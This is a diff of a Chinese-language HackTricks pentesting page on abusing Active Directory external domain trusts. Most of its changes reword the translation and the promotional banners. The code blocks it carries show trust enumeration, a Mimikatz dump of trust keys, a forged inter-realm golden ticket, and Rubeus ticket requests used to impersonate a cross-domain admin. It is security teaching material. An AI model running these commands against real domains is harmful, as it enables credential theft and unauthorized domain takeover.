@@ -4,19 +4,19 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想访问**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks衣服**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord组**](https://discord.gg/hRep4RUj7f) 或 [**电报组**](https://t.me/peass) 或在**Twitter**上**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
 </details>
 
-在这种情况下，一个外部域信任你（或者两者互相信任），因此你可以获得对它的某种访问权限。
+在这种情况下，外部域信任您（或彼此信任），因此您可以在其上获得某种访问权限。
 
 ## 枚举
 
-首先，你需要**枚举**这个**信任关系**：
+首先，您需要**枚举**这种**信任**：
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -66,13 +66,13 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-在之前的枚举中发现，用户**`crossuser`**位于**`External Admins`**组中，该组在**外部域的DC**中具有**管理员访问权限**。
+在先前的枚举中发现用户 **`crossuser`** 在 **`External Admins`** 组中，该组在 **外部域的 DC** 中具有 **管理员访问权限**。
 
 ## 初始访问
 
-如果您在其他域中找不到您的用户的任何特殊访问权限，您仍然可以返回AD方法论，并尝试从非特权用户进行特权升级（例如，使用kerberoasting）：
+如果您在另一个域中找不到您的用户的任何 **特殊** 访问权限，您仍然可以返回到 AD 方法论，并尝试从一个非特权用户进行 **权限提升**（例如，像 kerberoasting 这样的操作）：
 
-您可以使用**Powerview函数**使用`-Domain`参数来枚举**其他域**，如下所示：
+您可以使用 **Powerview 函数** 来使用 `-Domain` 参数枚举 **其他域**，就像这样：
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -84,20 +84,20 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### SID History滥用
+### SID History Abuse
 
-您还可以在跨域信任中滥用[**SID History**](sid-history-injection.md)。
+您还可以在跨森林信任中滥用[**SID History**](sid-history-injection.md)。
 
-如果用户从一个域迁移到另一个域，并且未启用**SID过滤**，则可以将来自另一个域的**SID**添加到用户在跨域认证时的**令牌**中。
+如果用户从一个森林迁移到另一个森林，并且未启用**SID过滤**，则可以**添加来自另一个森林的SID**，并且在通过信任进行身份验证时，此**SID**将被**添加**到**用户的令牌**中。
 
 {% hint style="warning" %}
-提醒一下，您可以使用以下命令获取签名密钥
+作为提醒，您可以使用以下方式获取签名密钥
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-您可以使用**受信任的**密钥**签名**一个**模拟**当前域用户的**TGT**。
+您可以使用**受信任**的密钥**签署**一个**冒充**当前域用户的TGT。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -108,19 +108,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### 完整的冒充用户方法
-
-In this technique, we will impersonate a user in order to gain unauthorized access to their account. This can be done by obtaining the user's credentials through various means such as phishing, keylogging, or password cracking. Once we have the user's credentials, we can use them to log in to their account and perform actions on their behalf.
-
-To impersonate a user, we need to follow these steps:
-
-1. Obtain the user's credentials: This can be done through phishing attacks, where we trick the user into revealing their username and password. Another method is keylogging, where we capture the user's keystrokes to obtain their login information. Password cracking can also be used to guess or crack the user's password.
-
-2. Log in as the user: Once we have the user's credentials, we can log in to their account using their username and password. This can be done through the login page of the target application or system.
-
-3. Perform actions on behalf of the user: After successfully logging in as the user, we can perform various actions on their behalf. This can include accessing sensitive information, modifying settings, sending emails, or performing any other actions that the user is authorized to do.
-
-It is important to note that impersonating a user without their consent is illegal and unethical. This technique should only be used for legitimate purposes, such as penetration testing or authorized security assessments.
+### 完全模拟用户
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -136,12 +124,12 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* 你在一家 **网络安全公司** 工作吗？想要看到你的 **公司在 HackTricks 中被宣传**？或者想要访问 **PEASS 的最新版本或下载 HackTricks 的 PDF**？查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
+* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord 群组**](https://discord.gg/hRep4RUj7f) 或 **电报群组** 或 **关注** 我的 **推特** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。
 
 </details>
